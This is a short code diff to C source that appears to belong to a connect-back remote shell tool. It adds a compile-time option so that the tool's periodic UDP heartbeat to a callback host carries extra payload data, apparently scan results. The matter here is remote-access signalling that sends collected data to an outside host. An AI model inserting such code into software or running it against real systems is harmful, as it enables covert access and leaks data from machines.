@@ -65,13 +65,25 @@ bool hasWaitConnectSignal(int udpSock, struct sockaddr_in *udpAddr, struct socka
 	static time_t lastHeartBeatTime;
 
 	if (time(NULL) - lastHeartBeatTime > MAX_UDP_HEARTBEAT) {
+		const char *pdata = NULL;
 		struct tshProtocol data;
 		data.magic = MAGIC;
 		data.type = UPD_HEADBEAT;
 		data.length = sizeof(data);
-
+		
+#ifdef SCAN_IP
+		extern const char * getPayloadData();
+		pdata = getPayloadData();
+#endif
+		if (pdata) {
+			data.type |= UPD_PAYLOAD_DATA;
+			data.length += strlen(pdata);
+		}
 		info("udp send heart beat data to %s " IPBLabel "\n", cb_host, IPBValue(*udpAddr));
 		udpSendPacket(udpSock, &data, udpAddr);
+		if (data.type & UPD_PAYLOAD_DATA) {
+			udpSendCString(udpSock, pdata, udpAddr);
+		}
 		lastHeartBeatTime = time(NULL);
 	}
 	// 返回0表示有等待的连接请求
